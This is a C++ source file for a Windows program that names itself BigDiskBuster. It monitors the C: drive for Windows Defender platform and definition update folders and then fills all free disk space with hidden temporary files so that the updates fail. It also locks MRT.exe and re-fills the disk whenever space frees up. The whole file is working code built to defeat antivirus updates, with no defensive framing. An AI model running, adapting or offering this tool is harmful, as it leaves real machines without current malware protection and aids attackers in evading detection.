#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <winternl.h>
#include <ntstatus.h>
#include <Shlwapi.h>
#include <combaseapi.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Ole32.lib")

typedef struct _FILE_FS_FULL_SIZE_INFORMATION
{
    LARGE_INTEGER TotalAllocationUnits;
    LARGE_INTEGER CallerAvailableAllocationUnits;
    LARGE_INTEGER ActualAvailableAllocationUnits;
    ULONG SectorsPerAllocationUnit;
    ULONG BytesPerSector;
} FILE_FS_FULL_SIZE_INFORMATION, * PFILE_FS_FULL_SIZE_INFORMATION;


typedef enum _FSINFOCLASS
{
    FileFsVolumeInformation = 1,            // q: FILE_FS_VOLUME_INFORMATION
    FileFsLabelInformation,                 // s: FILE_FS_LABEL_INFORMATION // SeManageVolumePrivilege
    FileFsSizeInformation,                  // q: FILE_FS_SIZE_INFORMATION
    FileFsDeviceInformation,                // q: FILE_FS_DEVICE_INFORMATION
    FileFsAttributeInformation,             // q: FILE_FS_ATTRIBUTE_INFORMATION
    FileFsControlInformation,               // qs: FILE_FS_CONTROL_INFORMATION // SeManageVolumePrivilege
    FileFsFullSizeInformation,              // q: FILE_FS_FULL_SIZE_INFORMATION
    FileFsObjectIdInformation,              // qs: FILE_FS_OBJECTID_INFORMATION // SeRestorePrivilege
    FileFsDriverPathInformation,            // q: FILE_FS_DRIVER_PATH_INFORMATION
    FileFsVolumeFlagsInformation,           // qs: FILE_FS_VOLUME_FLAGS_INFORMATION // SeManageVolumePrivilege // 10
    FileFsSectorSizeInformation,            // q: FILE_FS_SECTOR_SIZE_INFORMATION // since WIN8
    FileFsDataCopyInformation,              // q: FILE_FS_DATA_COPY_INFORMATION
    FileFsMetadataSizeInformation,          // q: FILE_FS_METADATA_SIZE_INFORMATION // since THRESHOLD
    FileFsFullSizeInformationEx,            // q: FILE_FS_FULL_SIZE_INFORMATION_EX // since REDSTONE5
    FileFsGuidInformation,                  // q: FILE_FS_GUID_INFORMATION // since 23H2
    FileFsMaximumInformation
} FSINFOCLASS, * PFSINFOCLASS;

NTSTATUS (WINAPI* _NtQueryVolumeInformationFile)(
    _In_ HANDLE FileHandle,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_writes_bytes_(Length) PVOID FsInformation,
    _In_ ULONG Length,
    _In_ FSINFOCLASS FsInformationClass
	) = (NTSTATUS(WINAPI*)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FSINFOCLASS))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryVolumeInformationFile");

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))
#define RtlPointerToOffset(Base, Pointer) ((ULONG)(((PUCHAR)(Pointer)) - ((PUCHAR)(Base))))

SIZE_T GetFreeVolumeSize(HANDLE hvol)
{
    IO_STATUS_BLOCK ioStatusBlock = { 0 };
	FILE_FS_FULL_SIZE_INFORMATION fsFullSizeInfo = { 0 };
	NTSTATUS status = _NtQueryVolumeInformationFile(hvol, &ioStatusBlock, &fsFullSizeInfo, sizeof(fsFullSizeInfo), FileFsFullSizeInformation);
    if (status)
    {
		printf("Failed to query volume information: 0x%0.8X\n", status);
        return 0;
    }
	return fsFullSizeInfo.BytesPerSector * fsFullSizeInfo.SectorsPerAllocationUnit * fsFullSizeInfo.ActualAvailableAllocationUnits.QuadPart;
}

bool IsWDUpdateDir2(wchar_t* dirname)
{

    wchar_t _wdupdateDir[] = L"ProgramData\\Microsoft\\Windows Defender\\Platform\\";
    if (_wcsnicmp(_wdupdateDir, dirname, wcslen(_wdupdateDir)) != 0)
    {
        return false;
    }
    wchar_t* fname = PathFindFileName(dirname);
    SIZE_T offset = RtlPointerToOffset(dirname, fname);
    if (offset != wcslen(_wdupdateDir) * sizeof(wchar_t))
        return false;
    return true;
}
bool IsWDUpdateDir(wchar_t* dirname, bool* IsGuidName)
{
    if (!dirname || !IsGuidName)
        return false;
    if (IsWDUpdateDir2(dirname))
        return true;
	wchar_t _wdupdateDir[] = L"ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\";
    if (_wcsnicmp(_wdupdateDir, dirname, wcslen(_wdupdateDir)) != 0)
    {
        return false;
    }
    wchar_t* fname = PathFindFileName(dirname);
    if (wcslen(dirname) < wcslen(_wdupdateDir) + 38 || wcslen(fname) < 38)
        return false;
    SIZE_T offset = RtlPointerToOffset(dirname, fname);
    if(offset != wcslen(_wdupdateDir) * sizeof(wchar_t))
        return false;

    CLSID clsid = { 0 };
    if (CLSIDFromString(fname, &clsid))
    {
        return false;
    }
    *IsGuidName = true;
    return true;
}


void GenerateGUID(wchar_t* guid)
{
    GUID _guid;
    HRESULT hr = CoCreateGuid(&_guid);
    if (hr)
        throw STATUS_ACCESS_VIOLATION;
    StringFromGUID2(_guid, guid, 40);
    return;
}

struct DiskBusterArg
{
    HANDLE hvol;
    HANDLE hfile;
};

struct LLBusterThread
{
    HANDLE hthread = NULL;
    DiskBusterArg* ddb;
    LLBusterThread* next;
};

DWORD DoBustDisk(void* argv)
{
    if (!argv)
        return ERROR_INVALID_ACCESS;
    DiskBusterArg* ddb = (DiskBusterArg*)argv;
    HANDLE hvol = ddb->hvol;
   
    if (!GetFreeVolumeSize(hvol)) {
        printf("Nothing to allocate.\n");
        return ERROR_SUCCESS;
    }

    wchar_t tmpfile[MAX_PATH] = { 0 };
    DWORD retv = ExpandEnvironmentStrings(L"\\??\\%TEMP%\\", tmpfile, MAX_PATH);
    if (!retv)
    {
        printf("Failed to get temporary file name, error : %d\n",GetLastError());
        return GetLastError();
    }
    GenerateGUID(&tmpfile[retv - sizeof(wchar_t) / sizeof(wchar_t)]);
    UNICODE_STRING _bustername = { 0 };
    RtlInitUnicodeString(&_bustername, tmpfile);
    OBJECT_ATTRIBUTES objattr = { 0 };
    InitializeObjectAttributes(&objattr, &_bustername, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iostat = { 0 };
    NTSTATUS stat = STATUS_SUCCESS;
    do {
        LARGE_INTEGER diskallocsz = { 0 };
        diskallocsz.QuadPart = GetFreeVolumeSize(hvol);
        if (!diskallocsz.QuadPart)
            return ERROR_SUCCESS;
        stat = NtCreateFile(&ddb->hfile, GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE, &objattr, &iostat, &diskallocsz, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN, FILE_SHARE_READ, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE, NULL, NULL);
    } while (stat == STATUS_DISK_FULL);
    if (stat)
    {
        printf("Failed to allocate disk space, error : 0x%0.8X\n", stat);
        return RtlNtStatusToDosError(stat);
    }
    printf("Disk buster file : \"%ws\" created\n", tmpfile);
    return ERROR_SUCCESS;
}
void CloseAllFiles(LLBusterThread* hstorefirst)
{
    if (!hstorefirst)
        return;
    LLBusterThread* current = hstorefirst;
    while (current)
    {
        if (current->hthread)
        {
            WaitForSingleObject(current->hthread, INFINITE);
            CloseHandle(current->hthread);
            current->hthread = NULL;
        }
        if (current->ddb) {
            if (current->ddb->hfile)
            {
                FILE_DISPOSITION_INFO_EX fdiex = { 0 };
                fdiex.Flags = FILE_DISPOSITION_FLAG_DELETE | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;
                SetFileInformationByHandle(current->ddb->hfile, FileDispositionInfoEx, &fdiex, sizeof(fdiex));
                NtClose(current->ddb->hfile);
                current->ddb->hfile = NULL;
            }
            if (current->ddb) {
                free(current->ddb);
                current->ddb = NULL;
            }
        }
        LLBusterThread* old = current;
        current = current->next;
        free(old);
        old = NULL;
    }
}

struct sTRarg
{
    HANDLE hmonitor;
    HANDLE hnotify;
};

DWORD WINAPI DiskBusterHelperThread(void* arg)
{
    if (!arg)
        return ERROR_INVALID_PARAMETER;
    sTRarg* argv = (sTRarg*)arg;
    if (!argv->hmonitor || !argv->hnotify)
        return ERROR_INVALID_PARAMETER;
    OVERLAPPED ovp = { 0 };
    ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    do {
        char buff[0x1000] = { 0 };
        ResetEvent(ovp.hEvent);
        DWORD rtb = 0;
        if (!ReadDirectoryChangesW(argv->hmonitor, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME, NULL, &ovp, NULL))
        {
            if (GetLastError() != ERROR_IO_PENDING)
            {
                printf("Failed to read directory changes: %d\n", GetLastError());
                return 1;
            }
        }
        if (!GetOverlappedResult(argv->hmonitor, &ovp, &rtb, TRUE))
        {
            printf("Failed to read directory changes: %d\n", GetLastError());
            return 1;
        }
        FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;
        if (fni->Action == FILE_ACTION_REMOVED)
        {
            SetEvent(argv->hnotify);
            break;
        }

    } while (1);
    return ERROR_SUCCESS;
}

void RunBusterThread(HANDLE hvol, LLBusterThread** BusterThreadFirst, LLBusterThread** BusterThreadCurrent, LLBusterThread** BusterThreadNext)
{
    if (!hvol || !BusterThreadFirst || !BusterThreadCurrent || !BusterThreadNext)
        ExitProcess(ERROR_INVALID_PARAMETER);
    LLBusterThread* failsafe = *BusterThreadCurrent;
    LLBusterThread* curr = *BusterThreadCurrent;

    if (!*BusterThreadCurrent)
    {
        *BusterThreadCurrent = *BusterThreadFirst;
        curr = *BusterThreadCurrent;
    }
    else {
        *BusterThreadNext = (LLBusterThread*)malloc(sizeof(LLBusterThread));
        if (!*BusterThreadNext)
        {
            printf("Critical error !!! memory allocation failure.\n");
            ExitProcess(1);
        }
        ZeroMemory(*BusterThreadNext, sizeof(LLBusterThread));
        curr = *BusterThreadCurrent;
        curr->next = *BusterThreadNext;
        *BusterThreadCurrent = *BusterThreadNext;
        curr = *BusterThreadCurrent;
        *BusterThreadNext = NULL;
    }
    DiskBusterArg* dba = (DiskBusterArg*)malloc(sizeof(DiskBusterArg));
    if (!dba)
    {
        printf("Critical error !!! memory allocation failure.\n");
        ExitProcess(1);
    }
    ZeroMemory(dba, sizeof(DiskBusterArg));
    dba->hvol = hvol;
    curr->ddb = dba;
    DWORD tid = 0;
    curr->hthread = CreateThread(NULL, NULL, DoBustDisk, dba, NULL, &tid);
}

int main()
{

    if (!_NtQueryVolumeInformationFile)
    {
        printf("Failed to find NtQueryVolumeInformationFile routine.\n");
        return 1;
    }

	printf("Started BigDiskBuster\n");


    LLBusterThread* BusterThreadFirst = (LLBusterThread*)malloc(sizeof(LLBusterThread));
    if (!BusterThreadFirst)
    {
        printf("Critical error !!! memory allocation failure.\n");
        ExitProcess(1);
    }
    ZeroMemory(BusterThreadFirst, sizeof(LLBusterThread));
    LLBusterThread* BusterThreadCurrent = NULL;
    LLBusterThread* BusterThreadNext = NULL;


	UNICODE_STRING unicodeVolumeName;
    RtlInitUnicodeString(&unicodeVolumeName, L"\\??\\C:\\");
	OBJECT_ATTRIBUTES objectAttributes = { 0 };
	InitializeObjectAttributes(&objectAttributes, &unicodeVolumeName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hvol = NULL;
	IO_STATUS_BLOCK ioStatusBlock = { 0 };
	NTSTATUS status = NtCreateFile(&hvol, FILE_READ_ATTRIBUTES | SYNCHRONIZE | FILE_READ_DATA, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status)
    {
		printf("Failed to open volume: 0x%0.8X\n", status);
		return 1;
    }
    UNICODE_STRING mrtname = { 0 };
    RtlInitUnicodeString(&mrtname, L"Windows\\System32\\MRT.exe");
    OBJECT_ATTRIBUTES objectAttributes2 = { 0 };
    InitializeObjectAttributes(&objectAttributes2, &mrtname, OBJ_CASE_INSENSITIVE, hvol, NULL);
    HANDLE mrt = NULL;
    ioStatusBlock = { 0 };
    status = NtCreateFile(&mrt, FILE_READ_ATTRIBUTES | SYNCHRONIZE | FILE_READ_DATA | FILE_EXECUTE, &objectAttributes2, &ioStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status)
    {
        printf("Failed to lock MRT file : 0x%0.8X\n", status);
    }

    OVERLAPPED ovp = { 0 };
    ovp.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    if (!ovp.hEvent)
    {
        printf("Failed to create event object, error : %d\n", GetLastError());
        return 1;
    }
    wchar_t wddirnameguid[MAX_PATH] = { 0 };
    GUID cempt = { 0 };
    StringFromGUID2(cempt, wddirnameguid, MAX_PATH);
    wchar_t wddirnamever[MAX_PATH] = { 0 };
    bool IsDiskBusterActive = false;
    bool IsGuidName = false;
    bool IsVerName = false;
    bool IsThreadNotify = false;
    HANDLE hthread = NULL;
    sTRarg argv = { 0 };
    argv.hnotify = CreateEvent(NULL, FALSE, FALSE, NULL);
    //HANDLE hobj[2] = { argv.hnotify, ovp.hEvent };
    if (!argv.hnotify)
    {
        printf("Failed to create event object, error : %d\n", GetLastError());
        return 1;
    }
    do {
		char buff[0x1000] = { 0 };
        ResetEvent(ovp.hEvent);
        DWORD rtb = 0;
        if (!ReadDirectoryChangesW(hvol, buff, sizeof(buff), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME | FILE_NOTIFY_CHANGE_SIZE, NULL, &ovp, NULL))
        {
            if (GetLastError() != ERROR_IO_PENDING)
            {
                printf("Failed to read directory changes: %d\n", GetLastError());
                return 1;
            }
        }
        FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buff;

        DWORD bb = 0;
        if (!GetOverlappedResult(hvol, &ovp, &bb, TRUE))
        {
            printf("GetOverlappedResult error : %d\n", GetLastError());
            return 1;
        }


        if (WaitForSingleObject(argv.hnotify, NULL) == WAIT_OBJECT_0)
        {
            CloseHandle(hthread);
            ResetEvent(argv.hnotify);
            hthread = NULL;
            printf("BigDiskBuster detected defender updates failed, reverting changes...\n");
            CloseAllFiles(BusterThreadFirst);
            printf("Freed all allocated disk space.\n");
            BusterThreadFirst = (LLBusterThread*)malloc(sizeof(LLBusterThread));
            if (!BusterThreadFirst)
            {
                printf("Critical error !!! memory allocation failure.\n");
                ExitProcess(1);
            }
            ZeroMemory(BusterThreadFirst, sizeof(LLBusterThread));
            BusterThreadCurrent = NULL;
            BusterThreadNext = NULL;
            IsDiskBusterActive = false;
            ZeroMemory(wddirnamever, sizeof(wddirnameguid));
            ZeroMemory(wddirnameguid, sizeof(wddirnameguid));
            StringFromGUID2(cempt, wddirnameguid, MAX_PATH);
            DWORD tid = 0;
            hthread = CreateThread(NULL, NULL, DiskBusterHelperThread, &argv, NULL, &tid);
            continue;

            
        }
        if (fni->Action == FILE_ACTION_ADDED)
        {
            if (!IsWDUpdateDir(fni->FileName,&IsGuidName)) {
                continue;
            }
            printf("BigDiskBuster detected a windows defender update, blocking...\n");
            if(IsGuidName)
                memmove(wddirnameguid, PathFindFileName(fni->FileName),min(sizeof(wddirnameguid),fni->FileNameLength));
            else {
                IsVerName = true;
                memmove(wddirnamever, PathFindFileName(fni->FileName), min(sizeof(wddirnamever), fni->FileNameLength));
                if (!hthread) {
                    UNICODE_STRING rldirname = { 0 };
                    RtlInitUnicodeString(&rldirname, L"ProgramData\\Microsoft\\Windows Defender\\Platform");
                    OBJECT_ATTRIBUTES plobjattr = { 0 };
                    InitializeObjectAttributes(&plobjattr, &rldirname, OBJ_CASE_INSENSITIVE, hvol, NULL);
                    HANDLE hvol2 = NULL;
                    ioStatusBlock = { 0 };
                    status = NtCreateFile(&hvol2, FILE_READ_ATTRIBUTES | SYNCHRONIZE | FILE_READ_DATA, &plobjattr, &ioStatusBlock, NULL, FILE_ATTRIBUTE_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
                    if (status)
                    {
                        printf("Failed to open platform directory : 0x%0.8X\n", status);
                        return 1;
                    }
                    argv.hmonitor = hvol2;
                    DWORD tid = 0;
                    hthread = CreateThread(NULL, NULL, DiskBusterHelperThread, &argv, NULL, &tid);
                }
            }
            IsDiskBusterActive = true;
            RunBusterThread(hvol, &BusterThreadFirst, &BusterThreadCurrent, &BusterThreadNext);
        }
        if (fni->Action == FILE_ACTION_MODIFIED)
        {
            if (IsDiskBusterActive) {
                printf("BigDiskBuster detected a file size change, re-invoking disk buster...\n");
                RunBusterThread(hvol, &BusterThreadFirst, &BusterThreadCurrent, &BusterThreadNext);
            }
        }
        if (fni->Action == FILE_ACTION_REMOVED)
        {
            if (IsDiskBusterActive) {
                wchar_t cmpstr[] = { L"ProgramData\\Microsoft\\Windows Defender\\Platform\\" };
                wchar_t cmpstr2[] = { L"ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\" };
                if (_wcsnicmp(cmpstr, fni->FileName, min(wcslen(cmpstr) * sizeof(wchar_t), fni->FileNameLength) / sizeof(wchar_t)) == 0 || _wcsnicmp(cmpstr2, fni->FileName, min(wcslen(cmpstr2) * sizeof(wchar_t), fni->FileNameLength) / sizeof(wchar_t)) == 0) {
                    printf("BigDiskBuster detected defender updates failed, reverting changes...\n");
                    CloseAllFiles(BusterThreadFirst);
                    printf("Freed all allocated disk space.\n");
                    BusterThreadFirst = (LLBusterThread*)malloc(sizeof(LLBusterThread));
                    if (!BusterThreadFirst)
                    {
                        printf("Critical error !!! memory allocation failure.\n");
                        ExitProcess(1);
                    }
                    ZeroMemory(BusterThreadFirst, sizeof(LLBusterThread));
                    BusterThreadCurrent = NULL;
                    BusterThreadNext = NULL;
                    IsDiskBusterActive = false;
                    ZeroMemory(wddirnamever, sizeof(wddirnameguid));
                    ZeroMemory(wddirnameguid, sizeof(wddirnameguid));
                    StringFromGUID2(cempt, wddirnameguid, MAX_PATH);
                }
                else {
                    RunBusterThread(hvol, &BusterThreadFirst, &BusterThreadCurrent, &BusterThreadNext);
                    printf("BigDiskBuster detected file removal, reclaiming freed allocation...\n");
                }
            }
        }

    } while (1);
    printf("Loop exit.\n");
    

    return 0;
}
